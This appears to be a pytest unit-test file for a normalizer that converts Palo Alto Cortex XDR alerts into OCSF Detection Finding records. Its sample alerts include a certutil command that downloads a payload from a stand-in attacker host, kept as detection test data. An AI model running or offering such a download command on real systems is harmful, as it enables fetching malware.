"""Unit tests for Cortex XDR alert -> OCSF normalization.

Tests the CortexXDROCSFNormalizer with multiple fixture types:
1. Full alert with MITRE ATT&CK, host, user, process, file, network info
2. Minimal alert with only required fields
3. Alert with process info but no file
4. Alert with public/private IP handling
5. Edge cases and missing field handling
"""

from __future__ import annotations

import hashlib
import json

import pytest

from alert_normalizer.cortex_xdr_ocsf import (
    SEVERITY_STR_TO_OCSF,
    CortexXDROCSFNormalizer,
)


@pytest.fixture
def normalizer():
    """Create a CortexXDROCSFNormalizer instance."""
    return CortexXDROCSFNormalizer()


# ── Test fixtures ────────────────────────────────────────────────────


@pytest.fixture
def full_alert() -> dict:
    """Full Cortex XDR alert with all fields populated."""
    return {
        "alert_id": 12345,
        "severity": "high",
        "alert_name": "Suspicious PowerShell Execution",
        "description": "PowerShell process spawned with encoded command line argument",
        "category": "Malware",
        "host_name": "WORKSTATION-01",
        "host_ip": "192.168.1.50",
        "user_name": "jdoe",
        "action_pretty": "Detected",
        "mitre_tactic_id_and_name": "TA0002 - Execution",
        "mitre_technique_id_and_name": "T1059 - Command and Scripting Interpreter",
        "source": "XDR Analytics",
        "detection_timestamp": 1710510600000,
        "event_type": "PROCESS",
        "action_file_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "action_file_md5": "d41d8cd98f00b204e9800998ecf8427e",
        "action_file_name": "powershell.exe",
        "action_file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "action_process_image_name": "powershell.exe",
        "action_process_image_command_line": "powershell.exe -enc SGVsbG8gV29ybGQ=",
        "actor_process_image_name": "cmd.exe",
        "actor_process_command_line": "cmd.exe /c powershell.exe -enc SGVsbG8gV29ybGQ=",
        "action_local_ip": "192.168.1.50",
        "action_remote_ip": "45.33.32.156",
        "action_remote_port": 443,
    }


@pytest.fixture
def minimal_alert() -> dict:
    """Minimal Cortex XDR alert with only base fields."""
    return {
        "alert_id": 99999,
        "severity": "low",
        "alert_name": "Low Severity Alert",
        "detection_timestamp": 1710597000000,
    }


@pytest.fixture
def process_only_alert() -> dict:
    """Alert with process info but no file info."""
    return {
        "alert_id": 55555,
        "severity": "medium",
        "alert_name": "Suspicious Process Execution",
        "description": "Process spawned with unusual command line",
        "host_name": "SERVER-DB-01",
        "host_ip": "10.0.0.100",
        "user_name": "svc_account",
        "action_process_image_name": "certutil.exe",
        "action_process_image_command_line": "certutil -urlcache -split -f http://attacker.example/payload.exe",
        "actor_process_image_name": "cmd.exe",
        "actor_process_command_line": "cmd.exe /c certutil",
        "detection_timestamp": 1710683400000,
        "source": "Cortex XDR Agent",
    }


@pytest.fixture
def public_ip_alert() -> dict:
    """Alert where action_local_ip is public (cloud workload)."""
    return {
        "alert_id": 77777,
        "severity": "critical",
        "alert_name": "Critical: C2 Communication Detected",
        "host_name": "CLOUD-VM-01",
        "action_local_ip": "54.239.28.85",
        "action_remote_ip": "45.33.32.156",
        "detection_timestamp": 1710769800000,
    }


@pytest.fixture
def network_only_alert() -> dict:
    """Alert with only network info."""
    return {
        "alert_id": 88888,
        "severity": "medium",
        "alert_name": "Suspicious Outbound Connection",
        "action_remote_ip": "91.234.56.42",
        "action_remote_port": 8080,
        "action_local_ip": "10.0.1.50",
        "detection_timestamp": 1710856200000,
    }


# ── OCSF scaffold tests ─────────────────────────────────────────────


class TestOCSFScaffold:
    """Test OCSF scaffold fields are correctly set."""

    def test_class_uid(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["class_uid"] == 2004

    def test_class_name(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["class_name"] == "Detection Finding"

    def test_category_uid(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["category_uid"] == 2
        assert result["category_name"] == "Findings"

    def test_activity(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["activity_id"] == 1
        assert result["activity_name"] == "Create"

    def test_type_uid(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["type_uid"] == 200401
        assert result["type_name"] == "Detection Finding: Create"

    def test_is_alert(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["is_alert"] is True


# ── Severity mapping tests ──────────────────────────────────────────


class TestSeverityMapping:
    """Test Cortex XDR severity string to OCSF severity mapping."""

    @pytest.mark.parametrize(
        ("xdr_severity", "expected_id", "expected_label"),
        [
            ("informational", 1, "Informational"),
            ("info", 1, "Informational"),
            ("low", 2, "Low"),
            ("medium", 3, "Medium"),
            ("high", 4, "High"),
            ("critical", 5, "Critical"),
        ],
    )
    def test_severity_mapping(
        self, normalizer, minimal_alert, xdr_severity, expected_id, expected_label
    ):
        minimal_alert["severity"] = xdr_severity
        result = normalizer.to_ocsf(minimal_alert)
        assert result["severity_id"] == expected_id
        assert result["severity"] == expected_label

    def test_severity_case_insensitive(self, normalizer, minimal_alert):
        minimal_alert["severity"] = "HIGH"
        result = normalizer.to_ocsf(minimal_alert)
        assert result["severity_id"] == 4
        assert result["severity"] == "High"

    def test_missing_severity_defaults_to_informational(
        self, normalizer, minimal_alert
    ):
        del minimal_alert["severity"]
        result = normalizer.to_ocsf(minimal_alert)
        assert result["severity_id"] == 1
        assert result["severity"] == "Informational"

    def test_none_severity_defaults_to_informational(self, normalizer, minimal_alert):
        minimal_alert["severity"] = None
        result = normalizer.to_ocsf(minimal_alert)
        assert result["severity_id"] == 1
        assert result["severity"] == "Informational"

    def test_unknown_severity_defaults_to_informational(
        self, normalizer, minimal_alert
    ):
        minimal_alert["severity"] = "unknown_value"
        result = normalizer.to_ocsf(minimal_alert)
        assert result["severity_id"] == 1
        assert result["severity"] == "Informational"

    def test_severity_with_whitespace(self, normalizer, minimal_alert):
        minimal_alert["severity"] = "  medium  "
        result = normalizer.to_ocsf(minimal_alert)
        assert result["severity_id"] == 3
        assert result["severity"] == "Medium"


# ── Time mapping tests ──────────────────────────────────────────────


class TestTimeMapping:
    """Test timestamp mapping to OCSF time fields."""

    def test_time_from_detection_timestamp(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["time"] == 1710510600000
        assert isinstance(result["time_dt"], str)

    def test_time_dt_is_iso_format(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        # Should be ISO 8601
        assert "T" in result["time_dt"]
        assert "+" in result["time_dt"] or "Z" in result["time_dt"]

    def test_no_time_without_detection_timestamp(self, normalizer, minimal_alert):
        del minimal_alert["detection_timestamp"]
        result = normalizer.to_ocsf(minimal_alert)
        assert "time" not in result
        assert "time_dt" not in result

    def test_invalid_detection_timestamp(self, normalizer, minimal_alert):
        minimal_alert["detection_timestamp"] = "not_a_number"
        result = normalizer.to_ocsf(minimal_alert)
        assert "time" not in result


# ── Message tests ────────────────────────────────────────────────────


class TestMessage:
    """Test message/title extraction."""

    def test_message_from_alert_name(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["message"] == "Suspicious PowerShell Execution"

    def test_message_falls_back_to_description(self, normalizer, full_alert):
        del full_alert["alert_name"]
        result = normalizer.to_ocsf(full_alert)
        assert result["message"] == full_alert["description"]

    def test_message_defaults_to_unknown(self, normalizer):
        result = normalizer.to_ocsf({"alert_id": 1})
        assert result["message"] == "Unknown Alert"


# ── Metadata tests ──────────────────────────────────────────────────


class TestMetadata:
    """Test OCSF metadata object."""

    def test_vendor_name(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["metadata"]["product"]["vendor_name"] == "Palo Alto Networks"
        assert result["metadata"]["product"]["name"] == "Cortex XDR"

    def test_ocsf_version(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["metadata"]["version"] == "1.8.0"

    def test_profiles(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert "security_control" in result["metadata"]["profiles"]

    def test_source_as_label(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert "source:XDR Analytics" in result["metadata"]["labels"]

    def test_alert_id_as_event_code(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["metadata"]["event_code"] == "12345"

    def test_no_labels_without_source(self, normalizer, minimal_alert):
        result = normalizer.to_ocsf(minimal_alert)
        assert "labels" not in result["metadata"]

    def test_no_event_code_without_alert_id(self, normalizer):
        result = normalizer.to_ocsf({"severity": "low"})
        assert "event_code" not in result["metadata"]


# ── Finding Info tests ──────────────────────────────────────────────


class TestFindingInfo:
    """Test OCSF finding_info object."""

    def test_uid(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["finding_info"]["uid"] == "12345"

    def test_title(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["finding_info"]["title"] == "Suspicious PowerShell Execution"

    def test_description(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert "PowerShell process" in result["finding_info"]["desc"]

    def test_analytic_name(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        analytic = result["finding_info"]["analytic"]
        assert analytic["name"] == "Suspicious PowerShell Execution"
        assert analytic["type_id"] == 1
        assert analytic["type"] == "Rule"

    def test_no_analytic_without_alert_name(self, normalizer):
        result = normalizer.to_ocsf(
            {"alert_id": 1, "description": "Something happened"}
        )
        assert "analytic" not in result["finding_info"]

    def test_data_sources(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert "XDR Analytics" in result["finding_info"]["data_sources"]

    def test_types_from_category(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert "Malware" in result["finding_info"]["types"]

    def test_no_types_without_category(self, normalizer, minimal_alert):
        result = normalizer.to_ocsf(minimal_alert)
        assert "types" not in result["finding_info"]


# ── MITRE ATT&CK tests ──────────────────────────────────────────────


class TestMitreAttack:
    """Test MITRE ATT&CK mapping from Cortex XDR format."""

    def test_full_attack_mapping(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        attacks = result["finding_info"]["attacks"]
        assert len(attacks) == 1
        assert attacks[0]["tactic"]["uid"] == "TA0002"
        assert attacks[0]["tactic"]["name"] == "Execution"
        assert attacks[0]["technique"]["uid"] == "T1059"
        assert attacks[0]["technique"]["name"] == "Command and Scripting Interpreter"

    def test_tactic_only(self, normalizer, minimal_alert):
        minimal_alert["mitre_tactic_id_and_name"] = "TA0001 - Initial Access"
        result = normalizer.to_ocsf(minimal_alert)
        attacks = result["finding_info"]["attacks"]
        assert len(attacks) == 1
        assert attacks[0]["tactic"]["uid"] == "TA0001"
        assert attacks[0]["tactic"]["name"] == "Initial Access"
        assert "technique" not in attacks[0]

    def test_technique_only(self, normalizer, minimal_alert):
        minimal_alert["mitre_technique_id_and_name"] = "T1059.001 - PowerShell"
        result = normalizer.to_ocsf(minimal_alert)
        attacks = result["finding_info"]["attacks"]
        assert len(attacks) == 1
        assert attacks[0]["technique"]["uid"] == "T1059.001"
        assert attacks[0]["technique"]["name"] == "PowerShell"
        assert "tactic" not in attacks[0]

    def test_no_attack_info(self, normalizer, minimal_alert):
        result = normalizer.to_ocsf(minimal_alert)
        assert "attacks" not in result["finding_info"]

    def test_empty_mitre_fields(self, normalizer, minimal_alert):
        minimal_alert["mitre_tactic_id_and_name"] = ""
        minimal_alert["mitre_technique_id_and_name"] = ""
        result = normalizer.to_ocsf(minimal_alert)
        assert "attacks" not in result["finding_info"]

    def test_subtechnique_parsing(self, normalizer, minimal_alert):
        minimal_alert["mitre_technique_id_and_name"] = (
            "T1059.003 - Windows Command Shell"
        )
        result = normalizer.to_ocsf(minimal_alert)
        attacks = result["finding_info"]["attacks"]
        assert attacks[0]["technique"]["uid"] == "T1059.003"
        assert attacks[0]["technique"]["name"] == "Windows Command Shell"


# ── Disposition tests ────────────────────────────────────────────────


class TestDisposition:
    """Test disposition mapping from action_pretty."""

    @pytest.mark.parametrize(
        ("action_pretty", "expected_id", "expected_label"),
        [
            ("Blocked", 2, "Blocked"),
            ("Prevented", 2, "Blocked"),
            ("Quarantined", 3, "Quarantined"),
            ("Detected", 15, "Detected"),
            ("Allowed", 1, "Allowed"),
        ],
    )
    def test_disposition_mapping(
        self,
        normalizer,
        minimal_alert,
        action_pretty,
        expected_id,
        expected_label,
    ):
        minimal_alert["action_pretty"] = action_pretty
        result = normalizer.to_ocsf(minimal_alert)
        assert result["disposition_id"] == expected_id
        assert result["disposition"] == expected_label

    def test_unknown_action_defaults_to_unknown(self, normalizer, minimal_alert):
        result = normalizer.to_ocsf(minimal_alert)
        assert result["disposition_id"] == 0
        assert result["disposition"] == "Unknown"

    def test_action_id_always_unknown(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["action_id"] == 0
        assert result["action"] == "Unknown"


# ── Device tests ─────────────────────────────────────────────────────


class TestDevice:
    """Test OCSF device object."""

    def test_full_device(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        device = result["device"]
        assert device["hostname"] == "WORKSTATION-01"
        assert device["name"] == "WORKSTATION-01"
        assert device["ip"] == "192.168.1.50"

    def test_hostname_only(self, normalizer, minimal_alert):
        minimal_alert["host_name"] = "SERVER-01"
        result = normalizer.to_ocsf(minimal_alert)
        device = result["device"]
        assert device["hostname"] == "SERVER-01"
        assert "ip" not in device

    def test_ip_only(self, normalizer, minimal_alert):
        minimal_alert["host_ip"] = "10.0.0.5"
        result = normalizer.to_ocsf(minimal_alert)
        device = result["device"]
        assert device["ip"] == "10.0.0.5"
        assert "hostname" not in device

    def test_no_device_without_host_fields(self, normalizer, minimal_alert):
        result = normalizer.to_ocsf(minimal_alert)
        assert "device" not in result


# ── Actor tests ──────────────────────────────────────────────────────


class TestActor:
    """Test OCSF actor object."""

    def test_actor_from_user_name(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["actor"]["user"]["name"] == "jdoe"

    def test_no_actor_without_user(self, normalizer, minimal_alert):
        result = normalizer.to_ocsf(minimal_alert)
        assert "actor" not in result


# ── Observables tests ────────────────────────────────────────────────


class TestObservables:
    """Test OCSF observables -- only public IPs and hashes."""

    def test_remote_public_ip_is_observable(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        obs = result["observables"]
        ip_obs = [o for o in obs if o["type_id"] == 2]
        ip_values = [o["value"] for o in ip_obs]
        assert "45.33.32.156" in ip_values

    def test_private_local_ip_not_observable(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        obs = result["observables"]
        ip_obs = [o for o in obs if o["type_id"] == 2]
        ip_values = [o["value"] for o in ip_obs]
        assert "192.168.1.50" not in ip_values

    def test_public_local_ip_is_observable(self, normalizer, public_ip_alert):
        result = normalizer.to_ocsf(public_ip_alert)
        obs = result["observables"]
        ip_obs = [o for o in obs if o["type_id"] == 2]
        ip_values = [o["value"] for o in ip_obs]
        assert "54.239.28.85" in ip_values
        assert "45.33.32.156" in ip_values

    def test_sha256_observable(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        obs = result["observables"]
        hash_obs = [o for o in obs if o["type_id"] == 8 and o["name"] == "SHA-256"]
        assert len(hash_obs) == 1
        assert hash_obs[0]["value"] == full_alert["action_file_sha256"]

    def test_md5_observable(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        obs = result["observables"]
        hash_obs = [o for o in obs if o["type_id"] == 8 and o["name"] == "MD5"]
        assert len(hash_obs) == 1
        assert hash_obs[0]["value"] == full_alert["action_file_md5"]

    def test_no_observables_without_ioc_fields(self, normalizer, minimal_alert):
        result = normalizer.to_ocsf(minimal_alert)
        assert "observables" not in result


# ── Evidences tests ──────────────────────────────────────────────────


class TestEvidences:
    """Test OCSF evidences -- process, file, and network info."""

    def test_process_evidence(self, normalizer, process_only_alert):
        result = normalizer.to_ocsf(process_only_alert)
        evidences = result["evidences"]
        proc_ev = [e for e in evidences if "process" in e]
        assert len(proc_ev) == 1
        proc = proc_ev[0]["process"]
        assert proc["name"] == "certutil.exe"
        assert "urlcache" in proc["cmd_line"]
        assert proc["parent_process"]["name"] == "cmd.exe"
        assert proc["parent_process"]["cmd_line"] == "cmd.exe /c certutil"

    def test_file_evidence(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        evidences = result["evidences"]
        file_ev = [e for e in evidences if "file" in e]
        assert len(file_ev) == 1
        f = file_ev[0]["file"]
        assert f["name"] == "powershell.exe"
        assert "WindowsPowerShell" in f["path"]
        assert len(f["hashes"]) == 2

    def test_file_hash_algorithms(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        evidences = result["evidences"]
        file_ev = next(e for e in evidences if "file" in e)
        algorithms = [h["algorithm"] for h in file_ev["file"]["hashes"]]
        assert "SHA-256" in algorithms
        assert "MD5" in algorithms

    def test_network_evidence(self, normalizer, network_only_alert):
        result = normalizer.to_ocsf(network_only_alert)
        evidences = result["evidences"]
        net_ev = [e for e in evidences if "dst_endpoint" in e or "src_endpoint" in e]
        assert len(net_ev) == 1
        assert net_ev[0]["src_endpoint"]["ip"] == "10.0.1.50"
        assert net_ev[0]["dst_endpoint"]["ip"] == "91.234.56.42"
        assert net_ev[0]["dst_endpoint"]["port"] == 8080

    def test_no_evidences_without_process_file_or_network(
        self, normalizer, minimal_alert
    ):
        result = normalizer.to_ocsf(minimal_alert)
        assert "evidences" not in result

    def test_full_alert_has_all_evidence_types(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        evidences = result["evidences"]
        # full_alert has process, file, and network info
        assert len(evidences) == 3
        types = set()
        for e in evidences:
            if "process" in e:
                types.add("process")
            if "file" in e:
                types.add("file")
            if "dst_endpoint" in e or "src_endpoint" in e:
                types.add("network")
        assert types == {"process", "file", "network"}


# ── Raw data tests ──────────────────────────────────────────────────


class TestRawData:
    """Test raw_data and raw_data_hash."""

    def test_raw_data_is_json(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        parsed = json.loads(result["raw_data"])
        assert parsed["alert_id"] == 12345

    def test_raw_data_hash_is_sha256(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        expected_hash = hashlib.sha256(result["raw_data"].encode()).hexdigest()
        assert result["raw_data_hash"] == expected_hash
        assert len(result["raw_data_hash"]) == 64

    def test_raw_data_hash_changes_with_content(
        self, normalizer, full_alert, minimal_alert
    ):
        result_full = normalizer.to_ocsf(full_alert)
        result_minimal = normalizer.to_ocsf(minimal_alert)
        assert result_full["raw_data_hash"] != result_minimal["raw_data_hash"]


# ── Status tests ────────────────────────────────────────────────────


class TestStatus:
    """Test status is always New for pulled alerts."""

    def test_status_is_new(self, normalizer, full_alert):
        result = normalizer.to_ocsf(full_alert)
        assert result["status_id"] == 1
        assert result["status"] == "New"


# ── Edge case tests ──────────────────────────────────────────────────


class TestEdgeCases:
    """Test edge cases and minimal inputs."""

    def test_empty_alert(self, normalizer):
        """An empty dict should still produce a valid OCSF scaffold."""
        result = normalizer.to_ocsf({})
        assert result["class_uid"] == 2004
        assert result["severity_id"] == 1
        assert result["message"] == "Unknown Alert"
        assert result["is_alert"] is True
        assert "raw_data" in result
        assert "raw_data_hash" in result

    def test_severity_mapping_constant_complete(self):
        """Verify SEVERITY_STR_TO_OCSF covers expected severity strings."""
        expected_keys = {"informational", "info", "low", "medium", "high", "critical"}
        assert set(SEVERITY_STR_TO_OCSF.keys()) == expected_keys

    def test_alert_id_zero(self, normalizer):
        """Alert ID of 0 should still be captured."""
        result = normalizer.to_ocsf({"alert_id": 0, "severity": "low"})
        assert result["metadata"]["event_code"] == "0"
        assert result["finding_info"]["uid"] == "0"

    def test_numeric_severity_falls_back(self, normalizer):
        """A numeric severity (not string) should fall back to Informational."""
        result = normalizer.to_ocsf({"severity": 4})
        assert result["severity_id"] == 1
        assert result["severity"] == "Informational"
